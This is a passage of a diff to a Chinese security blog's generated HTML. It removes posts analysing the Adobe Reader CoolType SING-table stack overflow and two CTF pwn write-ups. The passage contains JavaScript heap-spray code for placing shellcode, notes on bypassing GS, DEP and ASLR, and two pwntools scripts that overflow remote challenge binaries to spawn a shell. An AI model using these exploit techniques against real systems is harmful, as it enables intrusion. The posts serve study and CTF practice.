nop+&#x3D;nop;</span><br><span class="line">d &#x3D; nop.substring(0, (0x0c0c-0x24)&#x2F;2);</span><br><span class="line">d +&#x3D; shellcode;</span><br><span class="line">d +&#x3D; nop;</span><br><span class="line">e &#x3D; d.substring(0, 65536&#x2F;2);</span><br><span class="line">while(e.length &lt; 0x80000)</span><br><span class="line"> e +&#x3D; e;</span><br><span class="line">h &#x3D; e.substring(0, 0x80000 - (0x1020-0x08) &#x2F; 2);</span><br><span class="line">var slide &#x3D; new Array();</span><br><span class="line">for (i&#x3D;0;i&lt;0x1f0;i++)</span><br><span class="line"> slide[i]&#x3D;h+&quot;s&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>从TableEntry结构入口偏移0x11C即使SING表的真实数据，即从“00 00 01 00”开始的部分，接着再偏移0x10即可找到uniqueName域。</p>
-<p><img src="https://i.loli.net/2020/07/24/Ttae68OBCbc9GnL.png" alt="uniquename.PNG"></p>
-<p>执行strcat后会将“58 E0 8D AD”起始部分复制到ebp的指定地址，直到遇见NULL字符.</p>
-<h3 id="OD动态调试"><a href="#OD动态调试" class="headerlink" title="OD动态调试"></a>OD动态调试</h3><ul>
-<li>打开AR,OD中附加进程Cooltype.dll,溢出点strcat处下断点。</li>
-</ul>
-<p><img src="https://i.loli.net/2020/07/24/3AdJB9OGqLC2aHz.png" alt="捕获.PNG"></p>
-<ul>
-<li>溢出前，源地址数据如下，是SING表中的uniqueName字段的内容：</li>
-</ul>
-<p><img src="https://i.loli.net/2020/07/24/xjGeuh3y5vw1TKn.png" alt="捕获.PNG"></p>
-<p>正常情况下uniqueName字段为28字节，远小于栈空间大小0x104，就不会发生溢出。但是如果经过特殊构造，基于strcat复制内存时的特性（遇见NULL才停止）则会出现溢出。</p>
-<ul>
-<li>单步执行strcat函数后，目标地址位于栈中，站遭破坏，发生栈溢出。</li>
-</ul>
-<p><img src="https://i.loli.net/2020/07/24/1PhXAiMLfqOld2j.png" alt="捕获.PNG"></p>
-<ul>
-<li>将上面复制进去的数据下内存访问断点，执行，直到遇到call。但是这一步我始终跳不过去，程序往往会直接终止。后面我直接把call改成了retn，成功跳过，但是在内存访问断点之后遇到一个call又会终止程序，很糟心。</li>
-</ul>
-<h2 id="0x03-exploit分析"><a href="#0x03-exploit分析" class="headerlink" title="0x03 exploit分析"></a>0x03 exploit分析</h2><p>漏洞成因：Cooltype.dll中使用strcat函数时未对uniqueName字段的字符串长度进行检查，直接复制到固定大小的栈空间，最终导致栈溢出，攻击者篡改了TTF文件，在pdf文件中嵌入了JS脚本。</p>
-<h2 id="0x04-知识总结"><a href="#0x04-知识总结" class="headerlink" title="0x04 知识总结"></a>0x04 知识总结</h2><h3 id="绕过GS"><a href="#绕过GS" class="headerlink" title="绕过GS"></a>绕过GS</h3><ul>
-<li>通过安全cookie的检查，可以很好的探测栈是否被破坏/溢出；但是其也有很大弊端：只有在函数返回前，才会去检查security cookie，在之前是没有任何保护措施的.</li>
-<li>只要在安全cookie被检查之前劫持程序流程，就可无视GS保护，如OD中所示，产生溢出后，下内存访问断点，会有call 栈内数据的操作，由此直接劫持程序流程，从而绕过GS</li>
-</ul>
-<h3 id="绕过DEP"><a href="#绕过DEP" class="headerlink" title="绕过DEP"></a>绕过DEP</h3><ul>
-<li>通过构造ROP链，利用程序自身加载的库文件中的指令，来拼接出一系列指令去执行</li>
-<li>通过构造ROP链，利用程序自身加载的库文件中的指令，来拼接出一系列指令去执行</li>
-<li>进一步调用memcpy将shellcode复制到此空间，从而实现shellcode的执行，绕过DEP</li>
-</ul>
-<h3 id="绕过ASLR"><a href="#绕过ASLR" class="headerlink" title="绕过ASLR"></a>绕过ASLR</h3><ul>
-<li>开启ASLR后，其对堆基址做了随机化处理，但对于Heap Spray来说是无效的</li>
-<li>不管怎样对堆基址进行随机化，其基址总会出现在较低的内存空间，远远小于堆喷射所需的0x0c0c0c0c地址，因此，Heap spray 完全可以绕过 ASLR </li>
-</ul>
-<h3 id="调试思路总结"><a href="#调试思路总结" class="headerlink" title="调试思路总结"></a>调试思路总结</h3><ul>
-<li>构造恶意数据，实现栈溢出</li>
-<li>函数返回前（安全cookie检查前），调用恶意数据中的地址，开始实施ROP</li>
-<li>通过ROP，劫持执行流程指向0x0C0C0C0C</li>
-<li>js堆喷射覆盖地址0x0C0C0C0C，从而执行另一块ROP</li>
-<li>ROP块中为进程申请可执行权限的内存空间，并将shellcode复制其中</li>
-<li>shellcode执行，成功利用！</li>
-</ul>
-<blockquote>
-<p>太难啦OD动态调试调不出来！到底是因为啥子啊啊啊啊啊</p>
-</blockquote>
-
       
       
     </div>
@@ -1062,79 +1079,6 @@
 </blockquote>
 <p><img src="https://i.loli.net/2020/05/31/Kkm4sFIlzySxPZt.png" alt="gadget.PNG"></p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"> #coding&#x3D;utf-8</span><br><span class="line">from pwn import *</span><br><span class="line"> # context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">io &#x3D; remote(&#39;124.126.19.106&#39;,46612)</span><br><span class="line"> # io &#x3D; process(&quot;.&#x2F;pwn-100&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;pwn-100&quot;)</span><br><span class="line">rop1 &#x3D; 0x40075A #pop rbx_rbp_r12_r13_r14_r15</span><br><span class="line">rop2 &#x3D; 0x400740 #rdx(r13), rsi(r14), edi(r15d)</span><br><span class="line">pop_rdi_ret &#x3D; 0x400763</span><br><span class="line"> # start_addr &#x3D; elf.symbols[&#39;_start&#39;]</span><br><span class="line">start_addr &#x3D; 0x400550</span><br><span class="line">puts_plt &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line">read_got &#x3D; elf.got[&#39;read&#39;]</span><br><span class="line">binsh_addr &#x3D; 0x601000</span><br><span class="line">def leak(addr):</span><br><span class="line">  payload &#x3D; &quot;a&quot; * 0x48 + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">  payload &#x3D; payload.ljust(200, &quot;a&quot;)</span><br><span class="line">  io.send(payload)</span><br><span class="line">  io.recvuntil(&quot;bye~\n&quot;)</span><br><span class="line">  up &#x3D; &quot;&quot;</span><br><span class="line">  content &#x3D; &quot;&quot;</span><br><span class="line">  count &#x3D; 0</span><br><span class="line">  while True:</span><br><span class="line">    c &#x3D; io.recv(numb&#x3D;1, timeout&#x3D;0.5)</span><br><span class="line">    count +&#x3D; 1</span><br><span class="line">    if up &#x3D;&#x3D; &#39;\n&#39; and c &#x3D;&#x3D; &quot;&quot;:</span><br><span class="line">        content &#x3D; content[:-1] + &#39;\x00&#39;</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        content +&#x3D; c</span><br><span class="line">        up &#x3D; c</span><br><span class="line">  content &#x3D; content[:4]</span><br><span class="line">  log.info(&quot;%#x &#x3D;&gt; %s&quot; % (addr, (content or &#39;&#39;).encode(&#39;hex&#39;)))</span><br><span class="line">  return content</span><br><span class="line">d &#x3D; DynELF(leak, elf &#x3D; elf)</span><br><span class="line">sys_addr &#x3D; d.lookup(&#39;system&#39;, &#39;libc&#39;)</span><br><span class="line">log.info(&quot;system_addr &#x3D;&gt; %#x&quot;, sys_addr)</span><br><span class="line">payload  &#x3D; &quot;a&quot; * 0x48 + p64(rop1) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(binsh_addr) + p64(1)</span><br><span class="line">payload +&#x3D; p64(rop2)</span><br><span class="line">payload +&#x3D; &quot;\x00&quot; * 56  </span><br><span class="line">payload +&#x3D; p64(start_addr)</span><br><span class="line">payload  &#x3D; payload.ljust(200, &quot;a&quot;)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(&quot;bye~\n&quot;)</span><br><span class="line"> # gdb.attach(io)</span><br><span class="line">io.send(&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line">payload &#x3D; &quot;a&quot; * 0x48 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)</span><br><span class="line">payload &#x3D; payload.ljust(200, &quot;a&quot;)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-攻防世界-pwn-反应釜开关控制" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/" class="article-date">
-      <time datetime="2020-10-16T04:29:57.435Z" itemprop="datePublished">2020-10-16</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/">攻防世界-pwn-反应釜开关控制</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec:"></a>checksec:</h2><p><img src="https://i.loli.net/2020/07/15/3D5qjSLvGN2CJzT.png" alt="checksec.PNG"></p>
-<ul>
-<li>可以修改GOT表</li>
-<li>可以通过一处的方式来更改程序运行流</li>
-<li>堆栈不可执行</li>
-<li>地址随机化未开启</li>
-</ul>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>IDA查看，发现有/bin/sh。</p>
-<p><img src="https://i.loli.net/2020/07/15/wLf32ASzvt5brWm.png" alt="shell.PNG"></p>
-<p>get函数可溢出，偏移由v5得0x200h+0x8h(偏移对齐)=0x208h</p>
-<p><img src="https://i.loli.net/2020/07/15/9mZH7GCz2u8LJq5.png" alt="v5.PNG"></p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>exp:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r &#x3D; remote(&#39;220.249.52.133&#39;,39331)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;control&#39;)</span><br><span class="line">shell_addr &#x3D; 0x04005F6</span><br><span class="line">payload &#x3D; &#39;A&#39;*0x208 + p64(shell_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>看了一下大佬的wp，结果原来是盲打题……</p>
 
       
       
